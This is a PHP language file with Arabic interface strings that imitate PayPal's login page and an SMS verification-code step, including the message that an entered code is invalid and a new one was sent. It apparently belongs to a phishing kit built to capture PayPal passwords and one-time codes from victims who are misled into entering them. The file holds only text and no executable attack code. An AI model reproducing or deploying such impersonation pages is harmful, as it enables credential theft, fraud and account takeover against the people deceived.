<?php

function lang($phrase){
    static $lang = array(
        '1' => 'تسجيل الدخول إلى حساب PayPal الخاص بك',
        '2' => 'البريد الإلكتروني أو رقم الهاتف المحمول',
        '3' => 'كلمة المرور',
        '4' => 'هل نسيت كلمة المرور؟',
        '5' => 'تسجيل الدخول',
        '6' => 'أو',
        '7' => 'إنشاء حساب',
        '8' => 'الإنجليزية',
        '9' => 'الفرنسية',
        '10' => 'الإسبانية',
        '11' => '中文',
        '12' => 'فحص أمان سريع',
        '13' => 'نحتاج فقط إلى بعض المعلومات الإضافية للتحقق من أنك أنت.',
        '14' => 'استلام رسالة نصية',
        '15' => 'من خلال الاستمرار، تؤكد أنك مخول في استخدام هذا الرقم وتوافق على استلام رسائل نصية لتأكيد هويتك في هذه الجلسة. قد تتحمل رسوم الناقل. قد نتلقى تفاصيل الاشتراك والجهاز من مشغل الهاتف اللاسلكي لاستخدامها في أغراض المخاطرة والاحتيال.',
        '16' => 'التالي',
        '17' => 'اكتب الرمز الخاص بك',
        '18' => 'إعادة إرسال',
        '19' => 'متابعة',
        '20' => 'اتصل بنا',
        '21' => 'الخصوصية',
        '22' => 'قانوني',
        '23' => 'تحديثات السياسة',
        '24' => 'على مستوى العالم',
        '25' => 'رمز غير صالح. لقد أرسلنا لك رمزًا جديدًا.',
    );

    return $lang[$phrase];
}
?>
